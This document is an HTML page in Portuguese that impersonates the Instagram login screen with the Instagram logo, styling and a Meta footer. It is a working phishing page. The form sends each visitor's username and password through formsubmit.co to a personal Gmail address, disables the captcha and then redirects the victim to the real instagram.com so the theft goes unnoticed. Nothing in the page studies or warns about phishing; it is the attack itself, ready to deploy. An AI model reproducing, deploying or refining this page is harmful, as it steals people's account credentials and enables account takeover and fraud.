<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 40px;
      border: 1px solid #ddd;
      text-align: center;
      width: 300px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .logo {
      width: 120px;
      margin-bottom: 25px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-size: 14px;
    }

    button {
      background-color: #3897f0;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background-color: #318bda;
    }

    .footer {
      font-size: 12px;
      color: #999;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required>
      <input type="password" name="password" placeholder="Senha" required>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://instagram.com">
      <button type="submit">Entrar</button>
    </form>
    <div class="footer">
      © 2025 Instagram from Meta
    </div>
  </div>
</body>
</html>
